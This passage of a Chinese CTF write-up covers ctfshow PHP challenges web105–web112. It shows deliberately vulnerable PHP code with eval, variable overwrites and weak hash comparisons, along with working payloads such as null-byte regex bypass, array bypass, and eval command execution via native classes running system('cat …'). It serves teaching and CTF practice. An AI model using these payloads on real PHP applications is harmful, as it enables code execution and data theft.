</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="k">echo</span> <span class="s2">&#34;your are good&#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="k">die</span><span class="p">(</span><span class="nv">$suces</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">
</span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><ul>
<li>
<p>本题考查变量覆盖和<code>die()</code>的知识</p>
</li>
<li>
<p><code>$$a = $$b</code>可以类似于，将$a的地址指向$b</p>
<p>所以无论$b怎么改变值，$a的值都会和$b一样</p>
</li>
<li>
<p><code>die()</code>函数虽然会终止程序，但同时也会输出括号内的终止提示信息</p>
</li>
</ul>
<p>方法一：</p>
<p>本题利用变量覆盖和<code>die()</code>函数的特性</p>
<ol>
<li>先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces=flag，此时suces=&gt;flag的地址</li>
<li>再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error=suces，此时error=&gt;flag的地址</li>
<li>此时无论进入哪个<code>die()</code>函数，都可以输出<code>$flag</code>的值</li>
</ol>
<p>payload:</p>
<pre tabindex="0"><code>Get: suces=flag
POST: error=suces
</code></pre><p>方法二：</p>
<pre tabindex="0"><code>Get: ?suces=flag&amp;flag=
</code></pre><p>先将flag的值赋给suces，再将flag的值赋为空，从而通过判断，输出suces的值</p>
<h4 id="web106">web106<a hidden class="anchor" aria-hidden="true" href="#web106">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: atao
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 22:38:27
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v1</span><span class="p">)</span><span class="o">==</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$v2</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$v1</span><span class="o">!=</span><span class="nv">$v2</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>我们使用数组绕过即可</p>
<pre tabindex="0"><code>v1[]=1
v2[]=0
</code></pre><h4 id="web107">web107<a hidden class="anchor" aria-hidden="true" href="#web107">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 23:24:14
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="nv">$v3</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v3&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">       <span class="nx">parse_str</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$v2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">       <span class="k">if</span><span class="p">(</span><span class="nv">$v2</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$v3</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">           <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">       <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl">
</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>parse_str函数:它用于将字符串解析为变量，如果 str 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 arr 则会设置到该数组里 ）。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln">2</span><span class="cl">   <span class="c1">//parse_str()将查询的字符串解析到变量中
</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1"></span>   <span class="nx">parse_str</span><span class="p">(</span><span class="s2">&#34;name=Gopal K Verma&amp;age=45&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">4</span><span class="cl">   
</span></span><span class="line"><span class="ln">5</span><span class="cl">   <span class="k">echo</span> <span class="nv">$name</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">6</span><span class="cl">   <span class="k">echo</span> <span class="nv">$age</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>其实实际上就是md5弱比较</p>
<p>方法一：随便给一个值给flag，将MD5转换后的值赋给v3</p>
<pre tabindex="0"><code>v3=1
v1=flag=c4ca4238a0b923820dcc509a6f75849b
</code></pre><p>方法二:数组绕过</p>
<pre tabindex="0"><code>v3[]=1
v1=&#34;flag[]=1&#34;
</code></pre><h4 id="web108">web108<a hidden class="anchor" aria-hidden="true" href="#web108">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-28 23:53:55
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">
</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">ereg</span> <span class="p">(</span><span class="s2">&#34;^[a-zA-Z]+$&#34;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">===</span><span class="k">FALSE</span><span class="p">)</span>  <span class="p">{</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">
</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="c1">//只有36d的人才能看到flag
</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span><span class="o">==</span><span class="mh">0x36d</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>题目给出的0x36d为16进制数，十进制为877，需要字母开头或结尾的话为877a，因为是==弱比较，可以等同于877，逆序后为a778,直接读取不行，需要加一个截断%00来绕过正则的判断。</p>
<p>payload</p>
<pre tabindex="0"><code>GET:?c=a%00778
</code></pre><h4 id="web109">web109<a hidden class="anchor" aria-hidden="true" href="#web109">#</a></h4>
<p>考点:php原生类利用</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-29 22:02:34
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">
</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>关于php原生类的利用</p>
<p><a href="https://blog.csdn.net/weixin_54902210/article/details/124689580">https://blog.csdn.net/weixin_54902210/article/details/124689580</a></p>
<p>payload:</p>
<pre tabindex="0"><code>v1=Exception&amp;v2=system(&#39;cat fl36dg.txt&#39;) 
or
v1=Reflectionclass&amp;v2=system(&#39;cat fl36dg.txt&#39;)
</code></pre><p>其他的原生类也行，比如Error</p>
<h4 id="web110">web110<a hidden class="anchor" aria-hidden="true" href="#web110">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-29 22:49:10
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl">
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">
</span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">
</span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>依旧是对php原生类的利用</p>
<p>但是增加了对v1和v2的过滤，但是它没有过滤字母，考虑用纯字母构造payload</p>
<p>类<code>FilesystemIterator</code>可以用来遍历目录，需要一个路径参数</p>
<p>函数<code>getcwd</code>可以返回当前工作路径且不需要参数，由此可以构造payload</p>
<pre tabindex="0"><code>https://fded39f6-0eb1-430b-8f4f-42fd69937aed.challenge.ctf.show?v1=FilesystemIterator&amp;v2=getcwd
</code></pre><p><img alt="image-20250105235948415" loading="lazy" src="assets/image-20250105235948415.png"></p>
<p>得到flag的位置,直接访问即可</p>
<h4 id="web111">web111<a hidden class="anchor" aria-hidden="true" href="#web111">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: h1xa
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="cm"># @Last Modified by:   h1xa
</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="cm"># @Last Modified time: 2020-09-30 02:41:40
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="k">include</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="k">function</span> <span class="nf">getFlag</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$v1</span><span class="p">,</span><span class="o">&amp;</span><span class="nv">$v2</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;$</span><span class="si">$v1</span><span class="s2"> = &amp;$</span><span class="si">$v2</span><span class="s2">;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$$v1</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">
</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v1&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\&#34;|\&#39;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;error v2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">    
</span></span><span class="line"><span class="ln">33</span><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ctfshow/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="nx">getFlag</span><span class="p">(</span><span class="nv">$v1</span><span class="p">,</span><span class="nv">$v2</span><span class="p">);</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">   
</span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>这题是关于变量覆盖的题目</p>
<p>由于</p>
<pre tabindex="0"><code>if(preg_match(&#39;/ctfshow/&#39;, $v1)){
            getFlag($v1,$v2);
    }
</code></pre><p>所有我们可以确定v1的值只能为ctfshow</p>
<p>接下来看getFlag函数</p>
<pre tabindex="0"><code>function getFlag(&amp;$v1,&amp;$v2){
    eval(&#34;$$v1 = &amp;$$v2;&#34;);
    var_dump($$v1);
}
</code></pre><p>getFlag函数会将v1的地址指向v2，也就是说会使v1的值等于v2</p>
<p>var_dump则会输出变量的相关信息</p>
<p>那我们只需要使v2的值等于我们要查询的变量就可以读到我们的flag</p>
<p>但是问题来了，我们不知道要查的变量是什么，也不知道是不是在作用域里面</p>
<p>所这里使用超全局变量 $GLOBALS，$GLOBALS 是PHP的一个超级全局变量组，包含了全部变量的全局组合数组，变量的名字就是数组的键。</p>
<p>构造payload把所有全局变量全输出来</p>
<pre tabindex="0"><code>https://feec7abc-68b0-4b95-86bc-1db857e3624a.challenge.ctf.show?v1=ctfshow&amp;v2=GLOBALS
</code></pre><p><img alt="image-20250106003832148" loading="lazy" src="assets/image-20250106003832148.png"></p>
<h4 id="web112">web112<a hidden class="anchor" aria-hidden="true" href="#web112">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="cm"># -*- coding: utf-8 -*-
</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="cm"># @Author: Firebasky
</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="cm"># @Date:   2020-09-16 11:25:09
